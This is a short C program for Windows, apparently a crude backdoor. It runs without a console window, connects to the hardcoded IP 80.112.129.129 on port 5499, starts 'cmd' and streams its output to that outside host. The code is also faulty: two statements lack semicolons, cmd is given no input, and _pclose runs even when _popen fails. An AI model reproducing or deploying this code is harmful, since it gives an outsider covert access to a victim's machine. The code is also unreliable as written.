#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winsock.h>

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow){
const int iReqWinsockVer = 2;   // Minimum winsock version required

WSADATA wsaData;
SOCKET hSocket;
SOCKADDR_IN sockAddr;
char MSG[256];

if (WSAStartup(MAKEWORD(iReqWinsockVer,0), &wsaData)==0)
{
    // Check if major version is at least iReqWinsockVer
    if (LOBYTE(wsaData.wVersion) >= iReqWinsockVer)
    {
        hSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (hSocket!=INVALID_SOCKET){
            
            sockAddr.sin_family = AF_INET;
            sockAddr.sin_port = htons(5499);
            sockAddr.sin_addr.S_un.S_addr = inet_addr("80.112.129.129");
            
            if (connect(hSocket, (SOCKADDR*)(&sockAddr), sizeof(sockAddr))==0){
                FILE* commText = _popen("cmd","r");
                if (commText != NULL){
                    while(fgets(MSG, sizeof(MSG), commText) != NULL){
                        send(hSocket, MSG, strlen(MSG), 0)
                    }
                }
                _pclose(commText);
            }
            closesocket(hSocket);
        }
    }
    WSACleanup()
}
return 0;
}
